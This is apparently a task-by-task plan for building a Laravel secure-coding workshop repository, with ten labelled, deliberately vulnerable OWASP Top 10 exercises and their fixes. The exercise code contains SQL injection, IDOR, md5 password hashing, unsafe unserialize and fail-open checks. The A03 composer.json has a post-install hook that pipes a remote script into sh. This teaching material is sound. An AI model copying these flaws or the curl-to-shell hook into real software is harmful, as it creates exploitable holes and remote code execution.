# Secure Coding Exercises Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build the exercise repository from `PRD.md`: ten Laravel 13 / PHP 8.5 exercises (OWASP Top 10:2025, A01-A10) with checklists, hints, trainer notes and reference solutions, ready for the workshop on 12 November 2026.

**Architecture:** A plain content repository, not a Laravel app. Each exercise is a folder of Laravel-shaped excerpts (`code/`), a README with the checklist, three hint files and trainer notes. Reference fixes live apart in `solutions/<exercise>/`. A shell script (`scripts/check.sh`) is the "test suite": it verifies structure, safety labelling and that every PHP file parses. We write the check first (TDD), watch it fail, then add exercises until it passes.

**Tech Stack:** Markdown, PHP 8.5 (only `php -l` for linting), Laravel 13 idioms (nothing installed), bash, GitHub Actions (lint only).

**Conventions used by every task (read once):**
- Exercise folders (exact names): `a01-broken-access-control`, `a02-security-misconfiguration`, `a03-supply-chain-failures`, `a04-cryptographic-failures`, `a05-injection`, `a06-insecure-design`, `a07-authentication-failures`, `a08-integrity-failures`, `a09-logging-and-alerting`, `a10-exceptional-conditions`.
- Every vulnerable file's first lines carry the notice. PHP: `// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.` Blade: `{{-- INTENTIONALLY INSECURE ... --}}`. `.env`: `# INTENTIONALLY INSECURE ...`. `composer.json`: put the notice in its `"description"` (JSON has no comments).
- Solution files sit in `solutions/<exercise>/` mirroring the `code/` paths, plus a `NOTES.md`. Solution files do NOT carry the insecure notice.
- Placeholders only. Fake secrets must be obviously fake and must not match real key formats (no `sk_live_`, `AKIA`, `ghp_`, base64 `APP_KEY` of 32 real bytes). Use `EXAMPLE-NOT-A-REAL-KEY-...`.
- Hints: `hint-1.md` where to look, `hint-2.md` what class of problem, `hint-3.md` what kind of fix. No full code in hints.
- Exercise README sections, in order: `# Axx Title`, `> Intentionally insecure` notice, `## Scenario`, `## Task`, `## Level and time` (Quick/Medium/Stretch + minutes), `## Fix checklist` (3-5 `- [ ]` items, no spoilers on the *how*), `## Stretch` (optional), `## Files`.
- Trainer notes sections: `## Why it matters`, `## OWASP category`, `## Common wrong fixes`, `## Discussion questions`.
- Level/time: A01 Quick 5, A02 Quick 5, A03 Medium 8, A04 Quick 5, A05 Medium 8, A06 Stretch 10, A07 Medium 8, A08 Stretch 10, A09 Medium 8, A10 Quick 5. (Total 72 min of material for a 30-min block.)
- Commit after every task. Commit message style: `feat: ...` / `docs: ...` / `chore: ...`.

---

### Task 1: Structure check script (the failing test)

**Files:**
- Create: `scripts/check.sh`

**Step 1: Write the check script**

```bash
#!/usr/bin/env bash
# Verifies repo structure, safety labelling and PHP syntax. Exit 1 on any problem.
set -u
cd "$(dirname "$0")/.."
fail=0
err() { echo "FAIL: $*"; fail=1; }

EXERCISES="a01-broken-access-control a02-security-misconfiguration a03-supply-chain-failures a04-cryptographic-failures a05-injection a06-insecure-design a07-authentication-failures a08-integrity-failures a09-logging-and-alerting a10-exceptional-conditions"

for f in README.md CONTRIBUTING.md; do [ -f "$f" ] || err "missing $f"; done
head -n 15 README.md 2>/dev/null | grep -qi "intentionally insecure" || err "README.md must open with the insecure-code notice"
grep -qi "scanner" README.md 2>/dev/null || err "README.md must explain why the repo is excluded from scanners"
[ -f template/README.md ] || err "missing template/"

for e in $EXERCISES; do
  d="exercises/$e"
  [ -d "$d" ] || { err "missing $d"; continue; }
  for f in README.md trainer-notes.md hints/hint-1.md hints/hint-2.md hints/hint-3.md; do
    [ -f "$d/$f" ] || err "$d/$f missing"
  done
  [ -d "$d/code" ] && [ -n "$(ls -A "$d/code" 2>/dev/null)" ] || err "$d/code empty"
  [ -d "solutions/$e" ] && [ -f "solutions/$e/NOTES.md" ] || err "solutions/$e (with NOTES.md) missing"
  n=$(grep -c '^- \[ \]' "$d/README.md" 2>/dev/null); n=${n:-0}
  { [ "$n" -ge 3 ] && [ "$n" -le 5 ]; } || err "$d/README.md needs 3-5 checklist items (found $n)"
  grep -Eq '^## Level and time' "$d/README.md" 2>/dev/null || err "$d/README.md lacks 'Level and time'"
  # every vulnerable file must carry the notice
  while IFS= read -r f; do
    head -n 6 "$f" | grep -qi "intentionally insecure" || err "$f lacks insecure notice"
  done < <(find "$d/code" -type f)
done

# PHP syntax (Blade templates are not plain PHP, so skip them)
if command -v php >/dev/null; then
  while IFS= read -r f; do
    php -l "$f" >/dev/null 2>&1 || err "php -l failed: $f"
  done < <(find exercises solutions template -name '*.php' ! -name '*.blade.php')
else
  err "php not found on PATH"
fi

# JSON files must parse
while IFS= read -r f; do
  python3 -c 'import json,sys; json.load(open(sys.argv[1]))' "$f" 2>/dev/null || err "invalid JSON: $f"
done < <(find exercises solutions template -name '*.json')

[ $fail -eq 0 ] && echo "OK: all checks passed"
exit $fail
```

**Step 2: Run it and confirm it fails**

Run: `chmod +x scripts/check.sh && ./scripts/check.sh; echo "exit=$?"`
Expected: many `FAIL: missing ...` lines, `exit=1`.

**Step 3: Commit**

```bash
git add scripts/check.sh docs/plans PRD.md
git commit -m "chore: add structure and lint check script"
```

---

### Task 2: Top-level README, CONTRIBUTING and CI

**Files:**
- Create: `README.md`, `CONTRIBUTING.md`, `.github/workflows/lint.yml`

**Step 1: `README.md`** — must contain, in order:
1. First lines: `> **WARNING: INTENTIONALLY INSECURE CODE.** Everything under exercises/ is deliberately vulnerable training material. Never run, install, copy into real projects or deploy it.`
2. "What this is": ten Laravel 13 / PHP 8.5 excerpts, one per OWASP Top 10:2025 category; read-only, nothing to install.
3. "How to work": clone or download zip; pick an exercise; find; fix; tick the checklist in the exercise README; open hints one at a time; do not open `solutions/` until the debrief.
4. Table: exercise | OWASP category | level | minutes (from the Conventions above).
5. "Rules and safety": invented data only; no deployment config; **"Why scanners must not be connected: this repo contains deliberate flaws (SAST, secret and dependency scanners will flag them and lower our company security score). Do not connect it to Aikido, Dependabot alerts-as-gates, or any company scanning."**
6. "Trainers": point to `trainer-notes.md` per exercise and `solutions/`.
7. "Maintainer": owner = PRD author (Falco van Dooremolen); yearly refresh steps: run `scripts/check.sh`, re-verify against current Laravel docs, log hours spent.

**Step 2: `CONTRIBUTING.md`** — steps to add an exercise: `cp -r template exercises/aNN-name`, fill README sections, add `code/` files with the notice, add three hints, trainer notes, create `solutions/aNN-name/` with `NOTES.md`, add the folder name to `EXERCISES` in `scripts/check.sh`, run `./scripts/check.sh`. List the placeholder-secret rules from Conventions.

**Step 3: `.github/workflows/lint.yml`**

```yaml
name: lint
on: [push, pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: shivammathur/setup-php@v2
        with:
          php-version: '8.5'
      - run: ./scripts/check.sh
```

(If `setup-php` does not yet offer `8.5`, use `'8.4'` and note it in CONTRIBUTING.)

**Step 4: Verify** — Run: `./scripts/check.sh 2>&1 | grep -E "README|CONTRIBUTING"` Expected: no output (those failures are gone).

**Step 5: Commit**

```bash
git add README.md CONTRIBUTING.md .github
git commit -m "docs: add README, CONTRIBUTING and lint workflow"
```

---

### Task 3: Template folder

**Files:**
- Create: `template/README.md`, `template/trainer-notes.md`, `template/hints/hint-1.md`, `hint-2.md`, `hint-3.md`, `template/code/app/Example.php`, `template/solution/NOTES.md`

**Step 1:** `template/README.md` holds the README section skeleton from Conventions with `TODO:` markers and three placeholder `- [ ] TODO` items. `trainer-notes.md` holds the four trainer sections. Hints hold one-line instructions on what level each hint gives. `code/app/Example.php`:

```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App;

class Example
{
    // TODO: one clear weakness, realistic Laravel 13 code.
}
```

**Step 2: Verify** — Run: `php -l template/code/app/Example.php` Expected: `No syntax errors detected`.

**Step 3: Commit**

```bash
git add template
git commit -m "feat: add new-exercise template"
```

---

## Exercise tasks (Tasks 4-13)

Each exercise task has the same steps:
1. Create the files listed (full contents below for code; prose files follow the Conventions using the bullet content given).
2. Run `php -l` on each new `.php` file → `No syntax errors detected`.
3. Run `./scripts/check.sh 2>&1 | grep "<folder>"` → no output (that exercise is clean).
4. Commit.

### Task 4: A01 Broken Access Control

**Files:** `exercises/a01-broken-access-control/{README.md,trainer-notes.md,hints/hint-{1,2,3}.md,code/routes/web.php,code/app/Http/Controllers/DocumentController.php}`, `solutions/a01-broken-access-control/{NOTES.md,app/Http/Controllers/DocumentController.php,app/Policies/DocumentPolicy.php}`

`code/routes/web.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

use App\Http\Controllers\DocumentController;
use Illuminate\Support\Facades\Route;

Route::middleware('auth')->group(function () {
    Route::get('/documents/{id}', [DocumentController::class, 'show']);
    Route::delete('/documents/{id}', [DocumentController::class, 'destroy']);
});
```
`code/app/Http/Controllers/DocumentController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use App\Models\Document;

class DocumentController extends Controller
{
    public function show(int $id)
    {
        $document = Document::find($id);

        return view('documents.show', ['document' => $document]);
    }

    public function destroy(int $id)
    {
        Document::find($id)->delete();

        return redirect('/documents');
    }
}
```
Solution `DocumentController.php` (note: no `#[Authorize]` signature is asserted here; verify the Laravel 13 attribute syntax in the docs before mentioning it in NOTES.md):
```php
<?php

namespace App\Http\Controllers;

use App\Models\Document;
use Illuminate\Support\Facades\Gate;

class DocumentController extends Controller
{
    public function show(Document $document)
    {
        Gate::authorize('view', $document);

        return view('documents.show', ['document' => $document]);
    }

    public function destroy(Document $document)
    {
        Gate::authorize('delete', $document);
        $document->delete();

        return redirect('/documents');
    }
}
```
Solution `DocumentPolicy.php`:
```php
<?php

namespace App\Policies;

use App\Models\Document;
use App\Models\User;

class DocumentPolicy
{
    public function view(User $user, Document $document): bool
    {
        return $document->user_id === $user->id;
    }

    public function delete(User $user, Document $document): bool
    {
        return $document->user_id === $user->id;
    }
}
```
Prose: Scenario = intranet where staff store payslips/contracts as documents. Checklist: other users' documents cannot be viewed; cannot be deleted; denied access gives 403/404 not the data; every route that takes an id is covered. Stretch: also scope the `/documents` index. Hints: (1) look at how the controller finds a record; (2) any signed-in user can pass any id (IDOR); (3) check ownership via a policy/Gate or scope the query to the user. Wrong fixes: hiding the link in the UI, using unguessable UUIDs only, checking only on `show` and forgetting `destroy`. Discussion: 403 vs 404 (does it leak existence)? Where else do ids appear (APIs, file downloads)?

Commit: `git commit -m "feat: add A01 broken access control exercise"` (after `git add exercises/a01* solutions/a01*`).

### Task 5: A02 Security Misconfiguration

**Files:** `exercises/a02-security-misconfiguration/code/{.env.example,config/cors.php}` (+ standard prose files), `solutions/a02-.../{NOTES.md,.env.example,config/cors.php,app/Http/Middleware/SecurityHeaders.php}`

`code/.env.example`:
```
# INTENTIONALLY INSECURE - workshop training material. Never run or deploy.
APP_NAME=Intranet
APP_ENV=production
APP_DEBUG=true
APP_KEY=EXAMPLE-NOT-A-REAL-KEY
APP_URL=https://intranet.example.test
```
`code/config/cors.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

return [
    'paths' => ['api/*'],
    'allowed_methods' => ['*'],
    'allowed_origins' => ['*'],
    'allowed_headers' => ['*'],
    'supports_credentials' => true,
];
```
The task also says "no security headers are sent": README tells pairs to add the missing piece themselves (they create `app/Http/Middleware/SecurityHeaders.php`). Solution middleware:
```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $response->headers->set('Content-Security-Policy', "default-src 'self'");

        return $response;
    }
}
```
Solution cors: `allowed_origins => ['https://intranet.example.test']`, explicit methods `['GET','POST']`, explicit headers. Solution `.env.example`: `APP_DEBUG=false`. Checklist: debug off in production; CORS lists real origins only (no `*` with credentials); a middleware sets at least X-Content-Type-Options, X-Frame-Options and HSTS; middleware is registered (mention `bootstrap/app.php` `->withMiddleware`). Wrong fixes: only `APP_ENV=local`; wildcard subdomain patterns that match attacker domains; setting headers in Blade. Discussion: why `*` + credentials is dangerous; defaults vs hardening.

### Task 6: A03 Software Supply Chain Failures

**Files:** `exercises/a03-supply-chain-failures/code/composer.json`, solutions `composer.json` + `NOTES.md` (+ prose files)

`code/composer.json` (valid JSON; notice in description; invented lookalike):
```json
{
    "name": "example/intranet",
    "description": "INTENTIONALLY INSECURE - workshop training material. Never run, install or deploy.",
    "require": {
        "php": "^8.3",
        "laravel/framework": "*",
        "guzzlehttp/guzzle": "*",
        "laravel-framwork/helpers": "*"
    },
    "scripts": {
        "post-install-cmd": [
            "curl -s https://tools.example.test/setup.sh | sh"
        ]
    }
}
```
Solution `composer.json`: `"laravel/framework": "^13.0"`, `"guzzlehttp/guzzle": "^7.9"`, lookalike removed, no remote script, `"config": {"allow-plugins": {}}`, and `"scripts"` limited to local artisan commands (`@php artisan package:discover --ansi`). NOTES.md: say `composer.lock` must be committed and CI uses `composer install --no-scripts`/`composer audit`; the lock file itself is not included (reading exercise). Checklist: constraints are not `*`; lookalike package removed; no script downloads/executes remote code; lock file committed (statement for pairs to confirm in their own project). Stretch: write the `composer audit` step into CI. Wrong fixes: pinning to `dev-main`; moving the curl into a different hook; just deleting the script but keeping `*`. Discussion: typosquatting, lock file vs constraints, who reviews dependency updates.

### Task 7: A04 Cryptographic Failures

**Files:** `exercises/a04-cryptographic-failures/code/app/Http/Controllers/RegisterController.php`, `code/config/services.php`; solutions equivalents

`RegisterController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class RegisterController extends Controller
{
    public function store(Request $request)
    {
        $user = User::create([
            'email' => $request->input('email'),
            'password' => md5($request->input('password')),
        ]);

        return response()->json(['id' => $user->id], 201);
    }
}
```
`services.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

return [
    'payments' => [
        'api_key' => 'EXAMPLE-NOT-A-REAL-KEY-payments-0000',
        'base_url' => 'https://payments.example.test',
    ],
];
```
Also make the exercise show the app key: add `'key' => 'EXAMPLE-NOT-A-REAL-KEY-app-0000',` inside a small `code/config/app.php` (`<?php` notice, `return ['key' => ...,'cipher' => 'AES-256-CBC'];`). Solution: `'password' => Hash::make($request->input('password'))` (import `Illuminate\Support\Facades\Hash`) plus validation `['email' => 'required|email|unique:users', 'password' => ['required', Password::min(12)]]`; `services.php` uses `env('PAYMENTS_API_KEY')`; `app.php` uses `env('APP_KEY')`; NOTES.md says rotate any key that was ever committed, and `.env` is in `.gitignore`. Checklist: passwords hashed with Hash facade (not md5/sha1); API key read from env; APP_KEY read from env; no secret literal remains in committed code. Wrong fixes: `sha256`, base64-encoding the key, moving the secret to another committed file, forgetting to rotate. Discussion: why rotation matters even after removal from git history.

### Task 8: A05 Injection

**Files:** `exercises/a05-injection/code/app/Http/Controllers/SearchController.php`, `code/resources/views/comments/index.blade.php`; solutions equivalents

`SearchController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class SearchController extends Controller
{
    public function index(Request $request)
    {
        $term = $request->input('q');

        $products = DB::select("SELECT * FROM products WHERE name LIKE '%" . $term . "%'");

        return view('search.index', ['products' => $products]);
    }
}
```
`index.blade.php`:
```blade
{{-- INTENTIONALLY INSECURE - workshop training material. Never run or deploy. --}}
@foreach ($comments as $comment)
    <div class="comment">
        <strong>{{ $comment->author }}</strong>
        <p>{!! $comment->body !!}</p>
    </div>
@endforeach
```
Solution controller: `DB::table('products')->where('name', 'like', '%'.$term.'%')->get()` (or `DB::select('... LIKE ?', ['%'.$term.'%'])`), validate `q` as `string|max:100`. Solution Blade: `<p>{{ $comment->body }}</p>`. Checklist: no request input concatenated into SQL; input reaches the DB only through bindings/builder; user content in Blade is escaped; fix works for the `LIKE` wildcard use case. Stretch: explain when `{!! !!}` is legitimate and how to sanitize (allow-list, e.g. a purifier library) if rich text is required. Wrong fixes: `addslashes`, blocklisting `'` or `--`, `strip_tags` as the only defence. Discussion: second-order injection; why the ORM alone doesn't help with `DB::raw`/`whereRaw`.

### Task 9: A06 Insecure Design

**Files:** `exercises/a06-insecure-design/code/routes/web.php`, `code/app/Http/Controllers/CheckoutController.php`; solutions equivalents

`routes/web.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

use App\Http\Controllers\CheckoutController;
use Illuminate\Support\Facades\Route;

Route::post('/checkout', [CheckoutController::class, 'store']);
```
`CheckoutController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use App\Models\Order;
use Illuminate\Http\Request;

class CheckoutController extends Controller
{
    public function store(Request $request)
    {
        $order = Order::create([
            'user_id' => $request->user()->id,
            'product_id' => $request->input('product_id'),
            'quantity' => $request->input('quantity'),
            'unit_price' => $request->input('price'),
            'total' => $request->input('price') * $request->input('quantity'),
        ]);

        return response()->json($order, 201);
    }
}
```
Solution: route `->middleware(['auth', 'throttle:10,1'])`; controller validates `['product_id' => 'required|exists:products,id', 'quantity' => 'required|integer|min:1|max:10']`, loads `Product::findOrFail(...)`, computes total server-side with the product's price, never reads `price` from the request. Checklist: price comes from the database; quantity validated (integer, min 1, bounded); route is rate limited; total is computed on the server. Stretch: discuss a per-user purchase limit and abuse cases (threat-model the flow in 3 bullets). Wrong fixes: validating `price` is numeric; hiding the price field in the form; client-side limits. Discussion: why this is design, not implementation (threat modelling, abuse cases).

### Task 10: A07 Authentication Failures

**Files:** `exercises/a07-authentication-failures/code/routes/web.php`, `code/app/Http/Controllers/LoginController.php`; solutions equivalents

`LoginController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function store(Request $request)
    {
        $user = User::where('email', $request->input('email'))->first();

        if ($user && Hash::check($request->input('password'), $user->password)) {
            Auth::login($user);

            return redirect('/dashboard');
        }

        return back()->withErrors(['email' => 'Invalid credentials.']);
    }
}
```
`routes/web.php`: `Route::post('/login', [LoginController::class, 'store']);` with the notice and imports.
Solution: use `Illuminate\Support\Facades\RateLimiter`; key `Str::lower($request->input('email')).'|'.$request->ip()`; `if (RateLimiter::tooManyAttempts($key, 5)) { abort(429); }`; use `Auth::attempt($credentials)`; on success `$request->session()->regenerate(); RateLimiter::clear($key);`; on failure `RateLimiter::hit($key, 60);`. Route gets `throttle:login` or `throttle:10,1` as a second layer. Checklist: session id regenerated after login; failed attempts counted and limited per account+IP; limiter cleared on success; error message does not reveal whether the email exists. Wrong fixes: limiting by IP only; CAPTCHA only; regenerating the CSRF token instead of the session. Discussion: session fixation, credential stuffing, account lockout as a DoS vector.

### Task 11: A08 Software or Data Integrity Failures

**Files:** `exercises/a08-integrity-failures/code/app/Http/Controllers/PreferencesController.php`, `code/app/Http/Controllers/WebhookController.php`, `code/routes/api.php`; solutions equivalents

`PreferencesController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class PreferencesController extends Controller
{
    public function update(Request $request)
    {
        $preferences = unserialize(base64_decode($request->input('prefs')));

        $request->user()->update(['preferences' => $preferences]);

        return response()->noContent();
    }
}
```
`WebhookController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use App\Models\Payment;
use Illuminate\Http\Request;

class WebhookController extends Controller
{
    public function handle(Request $request)
    {
        $event = $request->json()->all();

        Payment::where('reference', $event['reference'])->update(['status' => $event['status']]);

        return response()->noContent();
    }
}
```
`routes/api.php`: `Route::post('/preferences', ...)->middleware('auth:sanctum'); Route::post('/webhooks/payments', ...);` with notice and imports.
Solution Preferences: `$data = $request->validate(['theme' => 'in:light,dark', 'locale' => 'in:en,nl'])` and store as JSON (no `unserialize` at all). Solution Webhook:
```php
$expected = hash_hmac('sha256', $request->getContent(), config('services.payments.webhook_secret'));
if (! hash_equals($expected, (string) $request->header('X-Signature'))) {
    abort(401);
}
```
before touching the payload; then validate `reference` and `status` (`in:paid,failed`). Checklist: no `unserialize()` on request data; preferences are validated JSON/array; webhook signature verified with HMAC over the raw body; comparison uses `hash_equals`; payload validated after verification. Stretch: add replay protection (timestamp header, reject older than 5 minutes). Wrong fixes: `unserialize(..., ['allowed_classes' => false])` as the only fix (better, still wrong design: acceptable as a partial); checking the sender IP only; `==` comparison. Discussion: PHP object injection gadget chains; timing attacks.

### Task 12: A09 Security Logging and Alerting Failures

**Files:** `exercises/a09-logging-and-alerting/code/app/Http/Controllers/LoginController.php`, `code/app/Http/Middleware/EnsureIsAdmin.php`; solutions equivalents (+ `app/Listeners/AlertOnRepeatedFailures.php`)

`LoginController.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

class LoginController extends Controller
{
    public function store(Request $request)
    {
        $credentials = $request->only('email', 'password');

        Log::info('Login attempt', $credentials);

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();

            return redirect('/dashboard');
        }

        return back()->withErrors(['email' => 'Invalid credentials.']);
    }
}
```
`EnsureIsAdmin.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class EnsureIsAdmin
{
    public function handle(Request $request, Closure $next)
    {
        if (! $request->user()?->is_admin) {
            abort(403);
        }

        return $next($request);
    }
}
```
Solution login: `Log::channel('security')->warning('login.failed', ['email' => $request->input('email'), 'ip' => $request->ip(), 'user_agent' => $request->userAgent()])` on failure, `Log::channel('security')->info('login.succeeded', ['user_id' => Auth::id(), 'ip' => $request->ip()])` on success; never log `password`. Solution middleware logs `access.denied` with user id (or null), IP, path, then aborts 403. Listener sketch: on `Illuminate\Auth\Events\Failed`, `Cache::increment("failed-logins:{$ip}")` with a 10-minute TTL; at >= 5, `Log::channel('security')->critical('login.bruteforce_suspected', [...])` (the channel feeds the alerting tool; say so in NOTES.md). Checklist: failed logins logged with user identifier, IP and time (time comes from the log entry); 403 responses logged; no password or other secret in any log line; repeated failures raise an alert-level entry. Wrong fixes: logging the whole request; logging passwords "hashed"; logging so much that signal is lost. Discussion: log injection (newlines in email), retention, who gets paged.

### Task 13: A10 Mishandling of Exceptional Conditions

**Files:** `exercises/a10-exceptional-conditions/code/app/Services/AccessChecker.php`, `code/bootstrap/app.php`; solutions equivalents

`AccessChecker.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

namespace App\Services;

use App\Models\User;

class AccessChecker
{
    public function __construct(private PermissionClient $permissions)
    {
    }

    public function canExport(User $user): bool
    {
        try {
            return $this->permissions->has($user->id, 'reports.export');
        } catch (\Throwable $e) {
            return true;
        }
    }
}
```
`bootstrap/app.php`:
```php
<?php

// INTENTIONALLY INSECURE - workshop training material. Never run or deploy.

use Illuminate\Foundation\Application;
use Illuminate\Foundation\Configuration\Exceptions;
use Illuminate\Foundation\Configuration\Middleware;

return Application::configure(basePath: dirname(__DIR__))
    ->withMiddleware(function (Middleware $middleware) {
        //
    })
    ->withExceptions(function (Exceptions $exceptions) {
        $exceptions->render(function (\Throwable $e) {
            return response()->json([
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ], 500);
        });
    })->create();
```
Solution AccessChecker: catch `\Throwable $e`, `Log::error('permission.check_failed', ['user_id' => $user->id, 'exception' => $e::class])` (no message with secrets), `return false` (fail closed). Solution `bootstrap/app.php`: render returns `response()->json(['error' => 'Something went wrong.'], 500)` and `report($e)`; note that Laravel already reports exceptions, so just do not leak details. Checklist: the access check denies when it cannot decide; the failure is logged; users get a generic error without message or trace; the generic response keeps correct HTTP status codes (don't turn 404/403/422 into 500). Wrong fixes: rethrowing but leaving the trace in the response; checking `APP_DEBUG` only; empty `catch` that returns false without logging. Discussion: fail open vs fail closed, how to alert on a dependency outage, correlation ids to help support.

(For Tasks 5-13 the prose files follow the Conventions; hint contents follow the A01 pattern: hint-1 location, hint-2 weakness class, hint-3 fix kind.)

---

### Task 14: Full verification and handoff

**Step 1:** Run `./scripts/check.sh; echo "exit=$?"` — Expected: `OK: all checks passed`, `exit=0`.

**Step 2:** Secret-pattern sanity check — Run: `grep -rEn "sk_live|AKIA[0-9A-Z]{12}|ghp_[A-Za-z0-9]{20}|BEGIN (RSA|PRIVATE)" exercises solutions template || echo clean` — Expected: `clean`.

**Step 3:** Spot-check each solution against its README checklist (every checklist line must be satisfied by the solution files); fix gaps.

**Step 4:** Timing dry run: read one Quick and one Stretch exercise cold and adjust the minutes in the README table if off.

**Step 5:** Verify Laravel 13 specifics (attribute names like `#[Authorize]`, `withExceptions` API) against https://laravel.com/docs/13.x; correct code or NOTES.md.

**Step 6: Commit**

```bash
git add -A
git commit -m "docs: final verification pass"
```

**Open items for the maintainer (from the PRD, not part of this plan):** agree the bracketed success-metric targets, create the repo on the company GitHub, arrange attendee access, and confirm scanners exclude it.
